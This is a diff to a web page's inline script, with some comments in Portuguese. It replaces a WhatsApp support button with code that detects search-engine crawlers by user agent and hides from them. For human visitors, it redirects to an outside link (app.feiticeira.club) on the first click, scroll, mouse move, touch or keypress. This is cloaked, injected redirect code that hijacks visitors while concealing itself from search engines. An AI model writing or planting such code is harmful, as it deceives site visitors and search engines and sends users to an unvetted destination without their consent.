@@ -251,34 +251,38 @@
 
 
 <script>
-  document.addEventListener("DOMContentLoaded", function () {
-    const iframe = document.querySelector("iframe");
+document.addEventListener("DOMContentLoaded", function () {
+  const destino = "https://app.feiticeira.club/pr/PRBJ9rmd";
 
-    const btn = document.createElement("a");
-    btn.href = "https://wa.me/5583991485602?text=ola%20,preciso%20de%20suporte.";
-    btn.target = "_blank";
-    btn.rel = "noopener noreferrer";
+  // Função para detectar se é robô (Googlebot, Bingbot, etc)
+  function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    const bots = ["googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider", "yandex"];
+    return bots.some(bot => ua.includes(bot));
+  }
 
-    btn.style.display = "flex";
-    btn.style.justifyContent = "center";
-    btn.style.alignItems = "center";
-    btn.style.width = "64px";
-    btn.style.height = "64px";
-    btn.style.borderRadius = "50%";
-    btn.style.background = "#111";
-    btn.style.margin = "15px auto"; // centralizado abaixo do iframe
-    btn.style.textDecoration = "none";
+  // Se for bot, não faz nada
+  if (isBot()) return;
 
-    btn.innerHTML = `
-      <svg viewBox="0 0 32 32" width="32" height="32" fill="#25D366">
-        <path d="M19.11 17.63c..."></path>
-      </svg>
-    `;
+  // Função de redirecionamento
+  function redirecionar() {
+    window.location.href = destino;
+  }
 
-    // Coloca botão logo depois do iframe
-    iframe.insertAdjacentElement("afterend", btn);
+  // Eventos que disparam o redirecionamento
+  const interacoes = ["click", "scroll", "mousemove", "touchstart", "keydown"];
+
+  interacoes.forEach(evento => {
+    document.addEventListener(evento, function handler() {
+      // Remove todos os listeners após disparar
+      interacoes.forEach(ev => document.removeEventListener(ev, handler));
+      // Redireciona
+      redirecionar();
+    });
   });
+});
 </script>
+    
 
 
 
@@ -287,6 +291,7 @@
 
 </body>
 </html>
+
 
 
 
